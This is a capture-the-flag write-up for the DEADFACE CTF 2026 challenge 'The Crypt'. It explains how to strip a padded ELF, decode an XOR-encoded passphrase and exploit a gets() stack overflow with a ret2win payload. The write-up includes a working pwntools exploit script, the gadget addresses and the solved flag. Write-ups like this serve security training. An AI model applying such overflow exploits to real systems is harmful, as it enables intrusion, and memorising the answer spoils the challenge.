---
title: The Crypt
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Reverse Engineering
---

# The Crypt

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | PWN / Binary Exploitation |
| **Points** | 100 |
| **Author** | @SpiffyLich |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> Hey — it's Charles, from ProudStrike's IR team. While helping one of our clients recover from a breach, we noticed this artifact was left behind somewhere on nearly every compromised computer... We've uploaded what we think is the "calling-card" program.
>
> Submit the flag as `deadface{flag-text}`.

Files given: `The_Crypt.zip` (513 MB download, SHA256: `93ceee41b1c1a4165658d7ba4ee9e1fd9aa58e2933b00cbd471112079cc32877`)
Target: `159.65.228.107:5001`

## Solution

### 1. Stripping the 513 MB bloat

Like [Cursed Mirror](cursed-mirror.md), the unpacked binary is padded to 513 MB with random bytes after the real ~19 KB x86-64 ELF ends. Reading the ELF header shows the actual program is non-PIE (`0x400000`) with **no stack canary**.

### 2. Passing the passphrase check

Before reaching the vulnerable function, the program prompts for a passphrase and compares the input against a 24-byte buffer (`nothing_at_all`) XORed with `0x13`. Decoding it yields:

```text
Open_The_Door_To_Nowhere
```

### 3. `ret2win` in `whispering_madness()`

Once `Open_The_Door_To_Nowhere` is entered, `whispering_madness()` reads the next line into a 64-byte stack buffer using **`gets()`** (`rbp - 0x40`, offset `72` bytes to the saved return address).

The binary contains an unreferenced win function, **`nowhere()` at `0x401660`**, which opens and prints `flag.txt`. Sending `72` bytes of padding followed by a 16-byte stack-alignment `ret` gadget (`0x40186c`) and `0x401660` prints the flag:

```python
from pwn import *

io = remote("159.65.228.107", 5001)
io.sendline(b"Open_The_Door_To_Nowhere")

payload = b"A" * 72 + p64(0x40186c) + p64(0x401660)
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
```

## Flag

!!! flag "Flag"
    `deadface{d3crypt3d_1nt0_n0th1ng}`

## Takeaways

When a `ret2win` function calls `fopen`/`printf` on x86-64 glibc, always insert a single `ret` gadget before the target function address so `RSP` stays 16-byte aligned for `movaps` instructions.
